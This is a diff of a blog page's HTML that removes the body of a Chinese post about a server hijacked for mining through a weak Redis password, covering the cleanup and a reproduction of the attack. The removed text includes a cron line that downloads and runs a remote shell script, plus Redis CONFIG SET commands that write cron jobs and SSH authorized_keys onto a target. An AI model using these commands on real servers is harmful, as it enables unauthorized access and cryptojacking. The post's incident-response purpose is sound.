@@ -210,7 +210,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://agayt.github.com/p/65017/">
+    <link itemprop="mainEntityOfPage" href="http://agayt.github.com/p/65033/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -223,7 +223,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/p/65017/" class="post-title-link" itemprop="url">redis弱口令邂逅</a>
+          <a href="/p/65033/" class="post-title-link" itemprop="url">redis弱口令邂逅</a>
         </h2>
 
         <div class="post-meta-container">
@@ -235,7 +235,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-04-07 14:01:36 / 修改时间：14:01:59" itemprop="dateCreated datePublished" datetime="2022-04-07T14:01:36+08:00">2022-04-07</time>
+      <time title="创建时间：2022-04-07 14:01:36 / 修改时间：14:07:00" itemprop="dateCreated datePublished" datetime="2022-04-07T14:01:36+08:00">2022-04-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -257,69 +257,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="记一个由于redis弱口令导致被当成矿机的记录"><a href="#记一个由于redis弱口令导致被当成矿机的记录" class="headerlink" title="记一个由于redis弱口令导致被当成矿机的记录"></a>记一个由于redis弱口令导致被当成矿机的记录</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>不久前腾讯服务器发来一封邮件警告我,说服务器用于挖矿,需要清除.这个服务器是之前学习springboot以及分布式时用来搭建实际生产环境的,搭建有常见的数据库,nginx以及tomcat等环境</p>
-<p><img src="https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407105956525.png" alt="image-20220407105956525"></p>
-<p>震惊之余,我连忙连接上服务器查看,在连接ssh时就发现连接速度十分慢,估计有个将近1分钟,并且输入命令查询延迟十分高,估计是挖矿占用cpu过高.</p>
-<h2 id="排除过程"><a href="#排除过程" class="headerlink" title="排除过程"></a>排除过程</h2><p>先到腾讯服务器的控制台查看最近的外网流量进出以及磁盘的读写,发现最近几天cpu持续跑满,我连忙去查看3月17日的登录日志发现了一有个登录,印象中好久没有登录过这台服务器了,于是在腾讯的安全控制台中找到了这个ip,是一个广西的ip</p>
-<p><img src="https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407111701896.png" alt="image-20220407111701896"></p>
-<ul>
-<li><p>通过<code>top -c</code>查看后找到占用最高的进程并找到其位置将其删除.</p>
-</li>
-<li><p>同时检查所有的定时任务文件<code>crontab -l</code>发现了有一个redis的乱码如下</p>
-<p>  <img src="https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407112531554.png" alt="image-20220407112531554"></p>
-<p>  在了解了定时任务的配置后,明白了这个文件中的3条命令每分钟触发一次,其中<code>cdt</code>与<code>wdt</code>在网上没有相关信息猜想可能是其他类型的主机上命令,只有<code>wget</code>能看懂,每分钟从<code>http://103.209.103.16:26800/ff.sh</code>下载文件并运行.可惜这个url已经失效了,查询一下是香港的vps,可能为了逃避法律责任,这台服务器已经到期了.</p>
-</li>
-</ul>
-<h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><p>首先将所有定时任务删除掉并禁用定时任务</p>
-<p>linux的定时任务有两种:</p>
-<ol>
-<li>系统的定时任务</li>
-</ol>
-<p>位于/etc/crontab 这个文件负责调度各种管理和维护任务。</p>
-<ol start="2">
-<li>用户的定时任务</li>
-</ol>
-<p>/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</p>
-<ol start="3">
-<li>其他</li>
-</ol>
-<p>还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
-<p>检查rc.*文件是否有设置开机自启动</p>
-<p>同时删除掉下载的挖矿文件,</p>
-<p>利用<code>iptables -L -n</code>查看可疑的 地址与端口没有发现,</p>
-<p>利用<code>netstat -ntlp</code>查看端口占用防止有后门</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在看到redis后想起之前部署redis时为了方便便把密码设置成了123456(因小失大!!:sob:),于是重新复现了这个漏洞</p>
-<p>连接到redis</p>
-<blockquote>
-<p><code>redis-cli -h target -a password(如果有的话)</code></p>
-</blockquote>
-<p>设置键</p>
-<blockquote>
-<p><code>set bar(名称随意) 定时任务</code></p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 也可以直接实现</span></span><br><span class="line">echo &quot;*/1 * * * * wget -O - http://103.209.103.16:26800/ff.sh | sh -s&quot; &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h target -a password -x set foo </span><br></pre></td></tr></table></figure>
-
-
-
-<p>redis持久化,</p>
-<p>redis的config命令可以在redis运行中动态修改redis的配置,其中set后面的字段为配置字段名,重启后会失效,如果需要同步到配置文件中可以通过rewrite命令实现</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename &quot;root&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class="line">save </span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
-<p>在写入cron后每一分钟就会实现一次.</p>
-<p>如果将命令换成公钥</p>
-<p>首先攻击者在本地生成好公私钥,通过redis实体化到target上最后用ssh的私钥登录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">(echo -e &quot;\n&quot;;cat od_rsa.pub;echo -e &quot;\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h target -a password -x set foo </span><br><span class="line"><span class="meta">#</span><span class="bash"> 一样持久化</span></span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class="line">save </span><br><span class="line">exit</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过ssh连接</span></span><br><span class="line">ssh -i id_rsa target</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果authorized_keys无法写入(root也无法修改),需要通过<code>lsattr </code>与<code>chattr</code>修改其属性</p>
-<p><strong>PS：有时候你发现用root权限都不能修改某个文件，大部分原因是曾经用chattr命令锁定该文件了。chattr命令的作用很大，其中一些功能是由Linux内核版本来支持的，不过现在生产绝大部分跑的linux系统都是2.6以上内核了。通过chattr命令修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录。lsattr命令是显示chattr命令设置的文件属性。</strong></p>
-<p>这两个命令是用来查看和改变文件、目录属性的，与chmod这个命令相比，chmod只是改变文件的读写、执行权限，更底层的属性控制是由chattr来改变的。</p>
-<blockquote>
-<p>+ ：在原有参数设定基础上，追加参数。</p>
-<p>- ：在原有参数设定基础上，移除参数。<br>= ：更新为指定参数设定。<br>A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。<br>S：硬盘I/O同步选项，功能类似sync。<br>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。<br>c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。<br>d：即no dump，设定文件不能成为dump程序的备份目标。<br>i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<br>i参数对于文件 系统的安全设置有很大帮助。<br>j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂  载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。<br>s：保密性地删除文件或目录，即硬盘空间被全部收回。<br>u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。 各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</p>
-</blockquote>
-
+          <p>记一个由于redis弱口令导致被当成矿机的记录</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/p/65033/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
